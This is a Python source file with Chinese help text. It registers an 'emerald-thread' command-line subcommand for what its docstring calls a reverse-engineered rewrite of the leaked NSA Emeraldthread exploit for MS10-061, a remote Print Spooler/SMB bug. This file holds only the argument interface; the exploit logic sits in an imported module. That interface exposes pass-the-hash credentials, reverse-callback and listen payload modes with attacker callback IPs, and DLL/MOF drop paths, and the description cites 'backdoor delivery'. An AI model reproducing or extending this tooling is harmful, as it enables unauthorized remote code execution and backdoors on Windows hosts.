"""emerald-thread — MS10-061 (EMERALDTHREAD) Print SMB 远程利用。

Python 重写的 NSA Emeraldthread 利用工具 `Emeraldthread-3.0.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 Print SMB/MS10-061 利用流程。
"""

from . import emerald_thread


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def emerald_thread_handle(args):
    """Run the EMERALDTHREAD exploitation sequence against the supplied host."""
    return emerald_thread.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        protocol=args.protocol,
        credentials=args.credentials,
        username=args.username,
        password=args.password,
        ntlm_hash=args.ntlm_hash,
        lanman_hash=args.lanman_hash,
        payload_type=args.payload_type,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        listen_port=args.listen_port,
        listen_local_port=args.listen_local_port,
        listen_wait=args.listen_wait,
        payload_source=args.payload_source,
        dll_buffer=args.dll_buffer,
        mof_buffer=args.mof_buffer,
        unconfigured_dll=args.unconfigured_dll,
        configured_mof=args.configured_mof,
        remote_dll_path=args.remote_dll_path,
        remote_mof_path=args.remote_mof_path,
        remote_mof_trigger_path=args.remote_mof_trigger_path,
        printer_name=args.printer_name,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `emerald-thread` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "emerald-thread",
        help="MS10-061 (EMERALDTHREAD) Print SMB 远程利用",
        description="Python 重写的 NSA Emeraldthread (EMERALDTHREAD / MS10-061) 利用工具 "
                    "Emeraldthread-3.0.0。通过 SMB/NBT 驱动打印服务，执行 DLL/MOF 文件"
                    "写入与后门投递。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445,
        help="目标端口（SMB 默认 445，NBT 默认 139）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--protocol",
        choices=["SMB", "NBT"],
        default="SMB",
        help="协议类型（默认 SMB）",
    )
    p.add_argument(
        "--credentials",
        choices=["Anonymous", "Guest", "No password", "Password", "NTLM hash", "Both hashes"],
        default="Anonymous",
        help="凭证类型（默认 Anonymous）",
    )
    p.add_argument(
        "--username", metavar="USER",
        help="用户名",
    )
    p.add_argument(
        "--password", metavar="PASS",
        help="密码",
    )
    p.add_argument(
        "--ntlm-hash", metavar="HEX",
        help="NTLM 密码哈希（十六进制）",
    )
    p.add_argument(
        "--lanman-hash", metavar="HEX",
        help="LANMAN 密码哈希（十六进制）",
    )
    p.add_argument(
        "--payload-type",
        choices=["Callback", "Callin", "DropAndExecute"],
        default="Callback",
        help="载荷类型：Callback 目标连回，Callin 目标等待连入，DropAndExecute 无反馈部署",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：目标连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-port", type=int, metavar="PORT",
        help="Callin 模式：目标监听端口",
    )
    p.add_argument(
        "--listen-local-port", type=int, metavar="PORT",
        help="Callin 模式：本地监听端口",
    )
    p.add_argument(
        "--listen-wait", type=int, default=10,
        help="Callin 模式：连入前等待秒数（默认 10）",
    )
    p.add_argument(
        "--payload-source",
        choices=["File", "Inline"],
        default="File",
        help="载荷来源：File 从文件加载，Inline 内嵌缓冲区",
    )
    p.add_argument(
        "--dll-buffer", metavar="BUFFER",
        help="Inline 模式：DLL 缓冲区（十六进制）",
    )
    p.add_argument(
        "--mof-buffer", metavar="BUFFER",
        help="Inline 模式：MOF 缓冲区（十六进制）",
    )
    p.add_argument(
        "--unconfigured-dll", metavar="FILE",
        help="File 模式：未配置的 DLL 文件（默认 esud.dll）",
    )
    p.add_argument(
        "--configured-mof", metavar="FILE",
        help="File 模式：已打补丁的 MOF 文件（默认 nnetcfg.mof）",
    )
    p.add_argument(
        "--remote-dll-path", metavar="PATH",
        help="目标 DLL 远程路径",
    )
    p.add_argument(
        "--remote-mof-path", metavar="PATH",
        help="目标 MOF 远程路径",
    )
    p.add_argument(
        "--remote-mof-trigger-path", metavar="PATH",
        help="目标 MOF 触发文件远程路径",
    )
    p.add_argument(
        "--printer-name", metavar="NAME",
        help="目标打印机名称",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=emerald_thread_handle)
